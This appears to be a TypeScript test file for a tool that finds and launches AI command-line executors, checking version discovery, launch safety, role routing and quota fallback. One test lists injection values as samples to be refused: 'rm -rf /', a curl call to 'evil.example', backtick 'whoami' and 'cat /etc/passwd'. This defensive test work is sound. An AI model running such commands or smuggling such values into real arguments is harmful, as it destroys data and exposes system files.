/**
 * Executor discovery and launch safety.
 *
 * Two things are proven here. Discovery survives the tool updating underneath it — the Claude binary
 * lives in a version-named extension folder, so a hardcoded path breaks silently on every upgrade.
 * And argv never carries anything the Director did not write, which is what keeps retrieved text
 * from becoming part of a command line.
 */
import assert from "node:assert/strict";
import test from "node:test";
import {
  compareVersions, selectExecutor, capabilitiesFromHelp, buildLaunchPlan,
  argvIsSafe, routeRole, readCapacity, capacityFallback,
  type CandidateV1,
} from "../src/executors.js";

const NOW = "2026-08-13T12:00:00.000Z";

const candidate = (over: Partial<CandidateV1> = {}): CandidateV1 => ({
  path: "C:/ext/anthropic.claude-code-2.1.231-win32-x64/resources/native-binary/claude.exe",
  source: "VSCODE_EXTENSION",
  version: "2.1.231",
  isFile: true,
  capabilities: { print: true, outputFormat: true, sessionId: true },
  ...over,
});

test("the newest valid install wins, so an upgrade does not break discovery", () => {
  const found = selectExecutor({
    executor: "claude",
    candidates: [
      candidate({ version: "2.1.231" }),
      candidate({ version: "2.2.4", path: "C:/ext/newer/claude.exe" }),
      candidate({ version: "2.0.9", path: "C:/ext/older/claude.exe" }),
    ],
    probedAt: NOW,
  });
  assert.equal(found.available, true);
  assert.equal(found.version, "2.2.4");
  assert.equal(found.candidatesConsidered.length, 3);
});

test("an explicit override beats any discovered install", () => {
  const found = selectExecutor({
    executor: "claude",
    candidates: [
      candidate({ version: "9.9.9", path: "C:/ext/newest/claude.exe" }),
      candidate({ version: "1.0.0", path: "C:/owner/claude.exe", source: "CONFIGURED_OVERRIDE" }),
    ],
    probedAt: NOW,
  });
  assert.equal(found.path, "C:/owner/claude.exe", "naming a path is an instruction, not a hint");
});

test("two installs that cannot be ordered are reported, never silently resolved", () => {
  // The addendum is explicit: incomparable versions mean UNAVAILABLE plus the list, because
  // picking whichever the filesystem happened to enumerate first is a coin toss with consequences.
  const found = selectExecutor({
    executor: "claude",
    candidates: [
      candidate({ version: "2.1.231" }),
      candidate({ version: "nightly-build", path: "C:/ext/weird/claude.exe" }),
    ],
    probedAt: NOW,
  });
  assert.equal(found.available, false);
  assert.match(found.reason, /could not be ordered/);
  assert.equal(found.candidatesConsidered.length, 2, "both are named so a person can choose");
  assert.equal(compareVersions("2.1.231", "nightly"), null);
});

test("a batch shim is never selected, because spawn runs without a shell", () => {
  const found = selectExecutor({
    executor: "claude",
    candidates: [candidate({ path: "C:/npm/claude.cmd", source: "PATH" })],
    probedAt: NOW,
  });
  assert.equal(found.available, false);
  assert.match(found.reason, /none answered a version probe as a real executable/);
});

test("nothing installed is an answer, not a crash", () => {
  const none = selectExecutor({ executor: "grok", candidates: [], probedAt: NOW });
  assert.equal(none.available, false);
  assert.equal(none.source, "NONE");
  assert.match(none.reason, /no candidate executable/);
});

test("capabilities come from probing help, not from assumption", () => {
  // The real grok 1.0.3 flag surface.
  const grok = capabilitiesFromHelp(
    "--prompt-file <PATH> --output-format <F> --json-schema <S> --cwd <CWD> --permission-mode <MODE>",
  );
  assert.equal(grok.promptFile, true);
  assert.equal(grok.jsonSchema, true);
  assert.equal(grok.permissionMode, true);
  assert.equal(grok.sessionId, false, "absent flags stay absent");
});

// ---------------------------------------------------------------------------
// Launch safety
// ---------------------------------------------------------------------------

const grokDiscovery = (caps: Record<string, boolean> = {}) => selectExecutor({
  executor: "grok",
  candidates: [candidate({
    path: "C:/Users/User/.grok/bin/grok.exe",
    version: "1.0.3",
    capabilities: { promptFile: true, outputFormat: true, cwd: true, permissionMode: true, ...caps },
  })],
  probedAt: NOW,
});

test("the prompt travels as a file path, never as an argument", () => {
  const built = buildLaunchPlan({
    discovery: grokDiscovery(),
    role: "INDEPENDENT_ACCEPTANCE",
    cwd: "C:/wt-review",
    promptPath: "C:/AION/director/missions/m1/RUNS/r1/PROMPT.md",
    timeoutMs: 60_000,
  });
  assert.equal(built.ok, true, built.reason);
  assert.equal(built.plan!.shell, false);
  assert.ok(built.plan!.argv.includes("--prompt-file"));
  assert.ok(built.plan!.argv.includes("C:/AION/director/missions/m1/RUNS/r1/PROMPT.md"));
});

test("a reviewer gets the permission mode that cannot write", () => {
  const review = buildLaunchPlan({
    discovery: grokDiscovery(), role: "ADVERSARIAL_REVIEW",
    cwd: "C:/wt", promptPath: "C:/p.md", timeoutMs: 1000,
  });
  const modeIndex = review.plan!.argv.indexOf("--permission-mode");
  assert.equal(review.plan!.argv[modeIndex + 1], "dontAsk", "a review that can write is not a review");
});

test("argv carrying shell syntax is refused even though no shell is used", () => {
  const attacks = [
    ["--prompt-file", "C:/p.md; rm -rf /"],
    ["--cwd", "C:/wt && curl evil.example"],
    ["--output-format", "json`whoami`"],
    ["--prompt-file", "$(cat /etc/passwd)"],
  ];
  for (const argv of attacks) {
    assert.equal(argvIsSafe(argv).safe, false, `${argv.join(" ")} must be refused`);
  }
  assert.equal(argvIsSafe(["--print", "--output-format", "json"]).safe, true);
});

test("a build that cannot take a prompt file refuses rather than passing it inline", () => {
  const noFile = buildLaunchPlan({
    discovery: grokDiscovery({ promptFile: false }),
    role: "RESEARCH", cwd: "C:/wt", promptPath: "C:/p.md", timeoutMs: 1000,
  });
  assert.equal(noFile.ok, false);
  assert.match(noFile.reason, /will not be passed as an argument/);
});

test("an unavailable executor produces a refusal, not a broken plan", () => {
  const missing = selectExecutor({ executor: "grok", candidates: [], probedAt: NOW });
  const built = buildLaunchPlan({
    discovery: missing, role: "RESEARCH", cwd: "C:/wt", promptPath: "C:/p.md", timeoutMs: 1000,
  });
  assert.equal(built.ok, false);
  assert.equal(built.plan, null);
});

// ---------------------------------------------------------------------------
// Routing and capacity
// ---------------------------------------------------------------------------

test("routing is a table, so no model is asked who should do ordinary work", () => {
  assert.equal(routeRole("IMPLEMENT"), "claude");
  assert.equal(routeRole("INDEPENDENT_ACCEPTANCE"), "grok");
  assert.equal(routeRole("GIT_VERIFY"), "local");
  assert.equal(routeRole("TEST"), "local");
});

test("a reset time is recorded only when the executor named one", () => {
  const named = readCapacity("Usage limit reached. Quota resets at 2026-08-13T18:00:00Z");
  assert.equal(named.state, "RESET_AT_KNOWN_TIME");
  assert.equal(named.resetAt, "2026-08-13T18:00:00Z");

  const unnamed = readCapacity("You have reached your usage limit.");
  assert.equal(unnamed.state, "CAPACITY_EXHAUSTED");
  assert.equal(unnamed.resetAt, null, "an invented reset wakes a mission up to fail again");

  assert.equal(readCapacity("all good").state, "AVAILABLE");
});

test("exhaustion never reaches for a paid path", () => {
  const waiting = capacityFallback({
    role: "INDEPENDENT_ACCEPTANCE", exhausted: "grok", otherAvailable: ["claude"],
  });
  // Claude standing in for Grok would make the review not independent.
  assert.equal(waiting.action, "WAIT");
  assert.equal(waiting.executor, null);
  assert.match(waiting.reason, /no paid path/);
});

test("a role whose own executor is free is rerouted rather than made to wait", () => {
  const rerouted = capacityFallback({
    role: "IMPLEMENT", exhausted: "grok", otherAvailable: ["claude"],
  });
  assert.equal(rerouted.action, "REROUTE");
  assert.equal(rerouted.executor, "claude");
});
